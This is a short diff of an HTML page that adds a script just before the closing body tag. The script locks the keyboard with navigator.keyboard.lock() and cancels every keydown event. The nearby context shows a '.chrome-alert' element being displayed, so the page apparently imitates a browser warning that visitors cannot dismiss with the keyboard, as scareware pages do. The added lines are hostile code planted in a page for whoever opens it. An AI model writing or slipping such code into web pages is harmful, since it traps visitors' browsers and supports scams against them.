@@ -2521,7 +2521,12 @@ $(".chrome-alert").show();
 
 </script>
 
-
+<script>
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+return false;
+}
+</script>
 
 </body>
 
